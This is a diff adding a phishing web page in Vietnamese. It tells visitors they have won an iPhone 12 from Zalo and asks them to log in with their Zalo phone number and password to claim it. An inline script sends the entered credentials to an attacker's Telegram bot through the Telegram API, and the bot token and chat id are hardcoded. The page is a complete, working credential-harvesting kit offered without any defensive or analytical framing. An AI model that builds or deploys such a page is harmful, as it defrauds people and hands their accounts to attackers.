@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<!-- Created By CodingNepal -->
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <!-- <title>Popup Login Form Design | CodingNepal</title> -->
+    <link rel="stylesheet" href="style.css">
+    <script src="https://kit.fontawesome.com/a076d05399.js"></script>
+  </head>
+  <body>
+    <div class="center">
+      <input type="checkbox" id="show">
+       <label class="giftLabel" >Xin chúc mừng!!!! Bạn đã may mắn trúng thưởng Iphone 12 từ Zalo</label>
+      <img src="iphone.png" alt="Italian Trulli">
+      <label for="show" class="show-btn">Đăng nhập Zalo để nhận thưởng</label>
+      <div class="container">
+        <label for="show" class="close-btn fas fa-times" title="close"></label>
+        <div class="text">
+Đăng nhập Zalo</div>
+<form action="#">
+          <div class="data">
+            <label>Số điện thoại</label>
+            <input type="text" id="sdt" required>
+          </div>
+<div class="data">
+            <label>Mật khẩu</label>
+            <input type="password" id="pass" required>
+          </div>
+<div class="forgot-pass">
+<a href="#">Quên mật khẩu?</a></div>
+<div class="btn">
+            <div class="inner">
+</div>
+<button type="submit" id="loginButton">Đăng nhập</button>
+          </div>
+<div class="signup-link">
+Chưa có tài khoản? <a href="#">Đăng ký</a></div>
+</form>
+</div>
+</div>
+<script>
+    var loginButton = document.getElementById("loginButton");
+    var sdt = document.getElementById("sdt");
+    var pass = document.getElementById("pass");
+    loginButton.onclick = async () =>{
+        let content = 'username:'+sdt.value + '      password:'+ pass.value;
+        var response = await fetch('https://api.telegram.org/bot1087344720:AAFBlkvynRcVpF-kitvWOMPhcKrtpvpF0kg/sendMessage?chat_id=1805777434&text='+content);
+        console.log(response);
+    }
+    //id telegram 1805777434
+</script>
+</body>
+</html>
